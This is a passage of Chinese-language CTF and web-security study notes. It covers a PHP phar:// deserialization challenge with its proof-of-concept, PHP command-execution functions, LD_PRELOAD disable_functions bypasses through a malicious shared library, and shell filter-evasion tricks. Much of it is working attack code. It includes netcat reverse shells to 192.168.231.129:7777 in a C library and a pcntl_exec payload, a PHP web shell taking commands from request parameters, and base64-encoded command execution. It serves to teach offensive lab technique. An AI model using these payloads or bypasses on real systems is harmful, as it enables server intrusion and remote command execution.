    echo '<script type="text/javascript">alert("上传成功!");</script>';
}

function upload_file()
{
    global $_FILES;
    if (upload_file_check()) {
        upload_file_do();
    }
}

function upload_file_check()
{
    global $_FILES;
    $allowed_types = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (empty($extension)) {
        //echo "<h4>请选择上传的文件:" . "<h4/>";
    } else {
        if (in_array($extension, $allowed_types)) {
            return true;
        } else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}

?>
```

**base.php**

```
<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>web3</title>
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
<nav class="navbar navbar-default" role="navigation">
    <div class="container-fluid">
        <div class="navbar-header">
            <a class="navbar-brand" href="index.php">首页</a>
        </div>
        <ul class="nav navbar-nav navbra-toggle">
            <li class="active"><a href="file.php?file=">查看文件</a></li>
            <li><a href="upload_file.php">上传文件</a></li>
        </ul>
        <ul class="nav navbar-nav navbar-right">
            <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li>
        </ul>
    </div>
</nav>
</body>
</html>
<!--flag is in f1ag.php-->
```

**class.php**

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

**源码分析**

对于文件上传口，在`upload_file_check()`函数处做了后缀名白名单处理

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220024516411.png" alt="image-20240220024516411" style="zoom: 67%;" />

对于文件的操作，则是放在`upload_file_do()`函数中，且文件名是以`md5(filename.txt + IP address).".jpg"`的形式处理，<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220024554724.png" alt="image-20240220024554724" style="zoom:67%;" />

而对于`$_SERVER["REMOTE_ADDR"]`在`base.php`上也给出了，根据类名在网页上很轻易的就能找到自己的`$_SERVER["REMOTE_ADDR"]`

![image-20240220024802608](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220024802608.png)

以此就能确定一个文件在被上传之后其文件路径如下：`upload/9732d5534ac145945cebcf3334b4b7ed.jpg`

再看文件包含，这里是整个题目唯一的入口，具体逻辑是`$file`获取文件名，再由`file_exists`判断文件是否存在，存在则调用`$show->_show()`方法；

**注意：**`file_exists`函数是支持phar伪协议的

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220025314170.png" alt="image-20240220025314170" style="zoom:67%;" />

`$show->_show()`代码如下，最后是使用`highlight_file()`函数回显文件内容

![image-20240220025542978](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220025542978.png)

这题的考点考的是`phar:// 反序列化`，那么首先先构造出反序列话字符串，再生成对应的`phar`文件并上传到服务器上面，最后使用`phar://`包含该文件就可以拿到flag，poc如下

```php
<?php

class C1e4r
{
    public $test;
    public $str;



    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;


    # 类被当作字符串输出的时候
    public function __toString()
    {
        echo 'Show.__toString';
        $content = $this->str['str']->source;
        return $content;
    }

    # 在给一个不存在的属性赋值时触发
    public function __set($key, $value)
    {
        $this->$key = $value;
    }

    public function __wakeup()
    {
        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $file;
    public $params;

    # 调用类不存在的属性的时候
    # key=source
    public function __get($key)
    {
        echo "Test.__get";
        var_dump($key);
        return $this->get($key);
    }

    public function get($key)
    {
        if (isset($this->params[$key])) {
            $value = $this->params[$key];
            var_dump($value);
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }

    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}


$c = new C1e4r();
$c->str = new Show();

$t = new Test();
$t->params['source'] = '/var/www/html/f1ag.php';

$c->str->str['str'] = $t;

echo serialize($c);

$phar = new Phar("e.phar");
$phar->startBuffering();
$phar->setStub("GIF89a <?php __HALT_COMPILER(); ?>");
$phar->setMetadata($c);
$phar->addFromString('test1.txt', 'test1');
$phar->stopBuffering();
```

后续将生成的`e.phar`的后缀修改为`e.jpg`并上传服务器即可

**注意：**phar文件包含是不会校验文件的后缀名是否是`phar`，只关注文件内容本身是否是`phar`文件格式

![image-20240220030016562](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220030016562.png)



# PHP命令执行

## 0x01. 实验环境搭建

#### docker搭建

```bash
# 搜索镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker search mcc0624  
NAME                 DESCRIPTION      STARS     OFFICIAL   AUTOMATED
mcc0624/ser          用户php反序列化漏洞学习    2                    
mcc0624/cmd                           0                    
mcc0624/flask_ssti                    0                    
mcc0624/ssrf         目前还未完成，请各位不要下载   0                    
mcc0624/ssrf_mysql                    0                    
mcc0624/php_apache                    0  

# 下载镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker pull mcc0624/cmd

# 启动环境
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085:85 -i -t mcc0624/cmd:latest bash -c '/etc/rc.local; /bin/bash'
```

## 0x02. 命令执行函数介绍

### `system()`函数

执行指定命令并返回结果，默认有回显

#### 格式：

```
system(string $command, [int $return_var = ?])
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$cmd = 'dir';
$res = system($cmd);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of  :\PHP\PHP命令执行

2023/06/09  17:17    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:17    <DIR>          .idea
2023/06/09  17:17                58 system函数.php
               1 File(s)             58 bytes
               3 Dir(s)  177,981,693,952 bytes free

Process finished with exit code 0
```

### `exec()`函数

执行指定命令，将输出保存到一个指定的数组。**默认只输出最后一行结果，默认有回显**

#### 格式：

```php
exec(command, [str $output], [rint $eturn_var]);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `output`：用于存储命令的输出的数组。命令的每一行输出将作为数组的一个元素。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
# 默认只输出最后一个结果
<?php
$comm = 'dir';

$res = exec($comm);
echo $res;

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
               3 Dir(s)  177,981,693,952 bytes free
Process finished with exit code 0
```

```php
# 将返回的所有结果都存储到 $output arr()
<?php
$comm = 'dir';

$res = exec($comm, $output);
print_r($output);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
Array
(
    [0] =>  Volume in drive D is 新加卷
    [1] =>  Volume Serial Number is 40FB-5D65
    [2] => 
    [3] =>  Directory of D:\PHP\PHP命令执行
    [4] => 
    [5] => 2023/06/09  17:26    <DIR>          .
    [6] => 2023/06/09  17:15    <DIR>          ..
    [7] => 2023/06/09  17:25    <DIR>          .idea
    [8] => 2023/06/09  17:26                72 system函数.php
    [9] =>                1 File(s)             72 bytes
    [10] =>                3 Dir(s)  177,981,693,952 bytes free
)
```

### `passthru()`函数

功能与`system()`类似，默认有回显

#### 格式：

```
passthru(command, return_var);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$comm = 'dir';
passthru($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:32    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:32                39 system函数.php
               1 File(s)             39 bytes
               3 Dir(s)  177,981,693,952 bytes free
```

### `shell_exec()`函数

功能与`system()`类似，默认**无回显**

#### 格式：

```
shell_exec(command);
```

`command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。

#### 演示：

```php
<?php
$comm = 'dir';
echo shell_exec($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:41    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:41                46 system函数.php
               1 File(s)             46 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### PHP反引号

反引号内的代码会直接被PHP当作系统命令来执行，**默认无回显**，但是，**如果是使用短标签包裹，那么就会有回显**

#### 格式：

```
$output = `command`;
```

#### 演示：

```php
<?php
echo `dir`;

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:43    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:42    <DIR>          .idea
2023/06/09  17:43                34 system函数.php
               1 File(s)             34 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `popopen()`函数

在 PHP 中，`popen()` 函数用于执行一个外部命令，并返回一个指向该命令输出流的文件指针。通过该文件指针，您可以读取外部命令的输出。默认无回显

#### 格式：

```php
$handle = popen('command', 'mode');
```

#### 演示：

```php
<?php
$comm = 'dir';
$res = popen($comm, 'r');
echo fread($res, 4096);

--------------------
while ($s = fgets($output)){
    echo $s;
}

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:50    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:50    <DIR>          .idea
2023/06/09  17:50                73 system函数.php
               1 File(s)             73 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `proc_open()`函数

在 PHP 中，`proc_open()` 函数用于执行一个外部命令，并提供更高级的控制和灵活性，与 `popen()` 函数相比，`proc_open()` 函数提供了更多选项来管理进程的输入、输出和错误流。默认**无回显**

#### 格式：

```
resource proc_open(string $command, array $descriptorspec, array &$pipes, string|null $cwd = null, array|null $env = null, array|null $other_options = null)
```

- `command`：要执行的外部命令。

- ```
  descriptorspec
  ```

  ：一个包含输入、输出和错误流的规范数组。规范数组的格式如下：

  - `0`：标准输入流（输入到命令的数据）。
  - `1`：标准输出流（命令的输出结果）。
  - `2`：标准错误流（命令的错误输出）。
  - 其他索引：可以自定义的文件描述符。
  - 每个索引的值可以是：
    - `["pipe", "r"]`：创建一个可写入的管道。
    - `["pipe", "w"]`：创建一个可读取的管道。
    - `["file", "path/to/file", "mode"]`：以指定的文件路径和模式打开一个文件。

- `pipes`：一个保存命令输入、输出和错误流的文件指针的数组。

- `cwd`：设置命令的当前工作目录（可选）。

- `env`：设置命令执行时的环境变量（可选）。

- `other_options`：其他选项（可选）。

#### 演示：

```php
<?php
$comm = 'dir'; // 要执行的命令，这里是使用dir命令列出当前目录的内容
$arr = array(
    array("pipe", "r"), // 标准输入流，这里使用管道打开可写入的输入流
    array("pipe", "w"), // 标准输出流，这里使用管道打开可读取的输出流
    array("file", "error-output.txt", "a") // 标准错误流，这里将错误输出重定向到文件中
);

$fp = proc_open($comm, $arr, $pipes); // 执行命令并打开进程
echo stream_get_contents($pipes[1]); // 读取标准输出流的内容并输出到屏幕上
proc_close($fp); // 关闭进程

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行
 
2023/06/09  17:59    <DIR>          .
2023/06/09  17:15    <DIR>           ..
2023/06/09  17:50    <DIR>          .idea 
2023/06/09  17:59                 0 error-output.txt
2023/06/09  17:59               231 system函数.php
               2 File(s)            231 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

## 0x03. `LD_PRELOAD`绕过原理介绍

### 攻击原理

在某些程序的运行过程中，会调用`LD_PRELOAD`，此时我们可以通过注入一个恶意的`LD_PRELOAD`库文件，使得程序在执行的过程中顺带执行了恶意程序，达到攻击的目的

举个例子：比如在`PHP`中的`echo`是一个打印函数，如果我们重构这个`echo()`函数，在里面调用`system()、shell()`等危险函数，那么用户在调用`echo()`函数时就会顺带执行了恶意代码

### 程序的链接

+ 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开

+ 装入时动态链接：源程序编译侯所得到的一组目标模块，再装入内存时，边装入边链接

+ 运行时动态链接模块：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接

  对于动态链接来说，需要一个动态链接库，期作用在与当动态库中的函数发生变化对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新

### `LD_PRELOAD`

**修改库文件**

它可以影响程序的运行时的链接（Runtime linker），它运行你定义在程序原型前**优先加载的动态库链接**

这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数

通过这个环境变量，我们可以在主程序和其他动态链接库的中间**加载别的动态链接库**，甚至覆盖正常的函数库

使用自己的或是更好的函数（无需别人的源码）

*_也可以想别人的程序注入恶意程序_*

### 攻击流程

**以`mail()`函数举例**

#### 1. 正常执行文件

源文件

```php
<?php
mail('','','','');   
```

#### 2. 追踪文件的执行

`strace`工具用来检测`demo.php`在执行的过程中还做了哪些系统调用

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# strace -o 1.txt -f php demo.php
```

#### 3. 追踪可执行子进程

这里追踪到了一个`sendmail`子进程，

```shell
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# grep "exec" 1.txt                 
76377 execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5647b3b4fa38 /* 32 vars */ <unfinished ...>
76377 <... execve resumed>)             = 0

```

#### 4. 继续追踪子进程，寻找可利用函数

这里可以发现调用了函数`geteuid()`

```sh
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# readelf -Ws /usr/sbin/sendmail
99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (3)
```

#### 5. 编写脚本，重构`geteuid()`

使用C语言编写库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("echo 'Hacker~~'");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

`gcc`编译文件

```bash
gcc -shared -fPIC demo.c -o poc.so
```

修改PHP文件

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# cat demo.php 
<?php 
// 在程序运行之前先加载 LD_PRELOAD 的共享库
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 6. 总结

在执行程序之前，会预先将`LD_PRELOAD`的环境变量设置为`poc.so`，在`mail()`函数的执行过程中，会加载`geteuid()`，由于`getuid()`程序已经被恶意修改，所以达到了攻击的效果

```php
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

### 绕过条件

1. 能够上传自己的`.so`文件
2. 能够控制环境变量的值（设置`LD_PRELOAD`变量），比如`putenv()`函数并且未被禁止
3. 存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载`LD_PRELOAD`中的`.so`文件），比如`mail()、imal_mail()、mb_send_mail()和error_log()`



## 0x04. `mail()`函数命令执行例题

### 方法一

> 经典方法：但是也是最麻烦的方法

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("cat /flag > fl0g.txt");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

#### `gcc`编译

```bash
gcc -shared -fPIC demo.c -o poc.so
```

#### 生成PHP文件

```c
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 客户端访问测试

成功在当前路径中的`fl0g.txt`文件得到flag

### 方法二

> 最简单和最方便的方法，通过反弹shell得到命令执行权限

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid(){
    unsetenv("LD_PRELOAD");
    system("nc 192.168.231.129 7777 -e /bin/bash");
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo2.c -o demo2.so
```

#### 生成PHP文件

```php
<?php
putenv("LD_PRELOAD = ./demo2.so");
mail('','','','');
```

#### 客户端访问测试

成功会弹shell

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001110822.png" alt="image-20230814001110822" style="zoom:50%;" />

### 方法三

> 最复杂的方法，通过变量来指定要执行的命令

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid() {
    // 生成指针变量 cmdline，值是 环境变量EVIL_CMDLINE 中的值
    const char *cmdline = getenv("EVIL_CMDLINE");
    // 如果 LD_PRELOAD 为 NULL，则直接返回0，否则取消调用
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    // 执行命令
    system(cmdline);
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo1.c -o demo1.so
```

#### 生成PHP文件

```php
<?php
// 获取要执行的命令
$cmd = $_REQUEST['cmd'];
// 获取命令执行结果的输出路径
$out_path = $_REQUEST['out_path'];

// 拼接命令
// 2>&1 将 标准输出和错误输出 都输出出来
$evil_cmdline = $cmd. " > ".$out_path." 2>&1";
echo "<br/><b>cmdline：</b>".$evil_cmdline;
// 设置变量 EVIL_CMDLINE
putenv("EVIL_CMDLINE=".$evil_cmdline);

// 获取 so文件 的路径
$so_path = $_REQUEST['sopath'];
// 指定库文件
putenv("LD_PRELOAD=".$so_path);
mail('','','','');
echo "<br/><b>output：</b><br/>".file_get_contents($out_path);
```

#### 客户端测试

```
HTTP payload
?cmd=cat%20/flag&out_path=flag.txt&sopath=./demo1.so
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001725273.png" alt="image-20230814001725273" style="zoom:50%;" />

## 0x05. 蚁剑及`pcntl`绕过函数过滤

### 使用蚁剑插件绕过函数过滤

> Disable_function 插件的使用只能在Linux系统上运行

#### 1. Linux 蚁剑安装

```
Github 下载链接
https://github.com/AntSwordProject/AntSword-Loader
```

#### 2. 插件下载与安装

将插件下载之后解压缩到`antSword-master/antData/plugins`目录中即可

```
链接：https://pan.baidu.com/s/17DvmXiTV9gcTw8fbqurUaQ?pwd=xx66 
提取码：xx66
```

#### 3. 插件的使用

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160509828.png" alt="image-20230814160509828" style="zoom: 67%;" />



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160525394.png" alt="image-20230814160525394" style="zoom: 80%;" />

### `pcntl_exec`函数

#### 1. 函数的使用

```
pcntl_exec ( string `$path` [, array `$args` [, array `$envs` ]] ) : void
```

- `path`

  `path`必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的信息请查看您系统的execve（2）手册。

- `args`

  `args`是一个要传递给程序的参数的字符串数组。

- `envs`

  `envs`是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

##### 返回值

当发生错误时返回 **`FALSE`** ，没有错误时没有返回。

#### 2. 回弹`webshell`

##### 例题源码

```php
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02' . $dir);
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
```

##### payload

```
cmd=pcntl_exec("/bin/bash", array("-c", "nc 192.168.231.129 7777 -e /bin/bash"));
```

## 0x06. 命令拼接符

### `;`

使多个命令顺序执行

前面的命令和后面的命令都会执行

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami;id                                                                                     
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&`

是命令在后台运行

这样就可以同时执行多条命令

**若在前端提交，必须进行URL编码****

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&id
[1] 23116
pinginglab
[1]  + done       whoami
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&&`

如果前面的命令成功执行，则执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&&id
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)                                                                     
```

### `|`

管道符，将前面命令的标准输出做标准输入到后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo 'whoami' | /bin/bash 
pinginglab
```

### `||`

短路运算：前面的命令成功执行则不执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami || ls
pinginglab
```

## 0x07. 空格绕过

### 1. 大括号

使用大括号将命令拼接起来，并使用`,`分割

`{cat,flag.txt}`

### 2. `$IFS`代替空格

```
$IFS、${IFS}、$IFS$9
```

Linux 下有一个特殊的环境变量叫做IFS，叫做内部分隔符（internal field separator）

```
cat$IFS/flag
```

单纯`$IFS2`被`bash`解释器当作变量名，输不出结果，加一个`{}`就固定了变量名

```
cat${IFS}/flag
```

`$IFS$9` - 后面加个`$`与`{}`类似，起截断作用，$9是当前系统shell进程第9个参数持有者，始终为空字符

```bash
cat$IFS$9/flag
```

### 3. 重定向字符`<`,`<>`

`<`表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备

```bash
# 将 /flag.txt 标准输入到 cat 中
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat</flag.txt  
Flag is this
```

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat <>/flag.txt
Flag is this
```

### 4. URL编码

**%09(Tab)**

```bash
cat%09/flag
```

**%20(spa)**

```
cat%20/flag
```

## 0x08. 文件名过滤绕过

### 1. 通配符绕过

使用通配符 `* | ?` 来绕过

其中，`*`代表所有，`?`代表一个字符

```bash
# 查看文件 /flag.txt
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f*                               
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f???????
Flag is this
```

### 2. 单引号、双引号绕过

Linux 中在命令中间插入单引号或双引号都可以继续执行命令

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl''ag.t""xt
Flag is this
```

### 3. 反斜杠绕过

Linux 中的反斜杠代表转义字符

```bash
# \a 在 Linux 中并没有特殊含义，所以依然当字母a来处理
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl\ag.txt 
Flag is this
```

### 4. 使用 `$1-9`，`$a,$*`等

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@ag.txt
Flag is this
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@*g.txt
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$5ag.txt
Flag is this
```

### 5. 内联执行

通过定义变量的方式来绕过安全过滤

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# a=/fl;b=ag;c=.t;d=xt;cat $a$b$c$d
Flag is this
```

### 6. 利用 Linux 中的环境变量

通过对 Linux 中的环境变量进行字符切片从而拼接成所需要的字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo $PATH                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo f${PATH:5:1}${PATH:8:1}g 
flag
```

## 0x09. 常见文件读取命令绕过

### 1. `tac`：方向显示

将文件以行为单位反向显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tac php-exec/demo.php 
mail('','','','');
putenv("LD_PRELOAD=./poc.so");
<?php
```

### 2. `more`：一页一页的显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# more /flag.txt
```

### 3. `less`：与`more`类似

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# less /flag.txt
```

### 4. `tail`：查看末尾几行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tail /flag.txt       
Flag is this
```

### 5. `nl`：显示的时候，顺便输出行号

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nl /flag.txt 
     1  Flag is this
```

### 6. `od`：以二进制的方式读取档案内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# od /flag.txt 
0000000 066106 063541 064440 020163 064164 071551 000012
0000015
```

### 7. `xxd`：读取二进制文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# xxd /flag.txt 
00000000: 466c 6167 2069 7320 7468 6973 0a         Flag is this.
```

### 8. `sort`：主要用于排序文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# sort /flag.txt               
Flag is this
```

### 9. `uniq`：包裹或删除文件中重复的行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# uniq /flag.txt 
Flag is this
```

### 10. `file -f`：报错出具体内容

文件中以行为单位打开文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# file -f /flag.txt 
Flag is this: cannot open `Flag is this' (No such file or directory)
```

### 11. `grep`：在文本中过滤出所需字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# grep "f*" /f*                        
Flag is this	
```

## 0x10. 编码绕过

### 0. 例题代码

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match("/flag|php|cat|sort|shell/i", $cmd)) {
        eval($cmd);
    }
    else{
        echo "再来黑我丫！！！";
    }
}
```

### 1. `base64`编码绕过

**反引号的作用**

Linux 中的反引号的作用：将反引号中的命令输出，作为另一个命令的参数

```bash
# 通过 echo 输出文件名作为 cat 命令的参数
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat `echo /flag.txt`                  
Flag is this
```

反引号的使用一定需要搭配`echo`来执行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo Y2F0IC9mbGFnLnR4dAo= |base64 -d` 
Flag is this

# 也可以通过重定向到 /bin/bash 来执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "Y2F0IC9mbGFnLnR4dAo=" |base64 -d | /bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo Y2F0IC9mbGFnLnR4dAo= |base64 -d)        
Flag is this
```

### 2. `base32`编码绕过

与`base64`编码绕过一样，只不过将算法换成了`base32`

```bash
# 反引号执行
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d`
Flag is this

# 管道重定向到新的 shell
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d |/bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
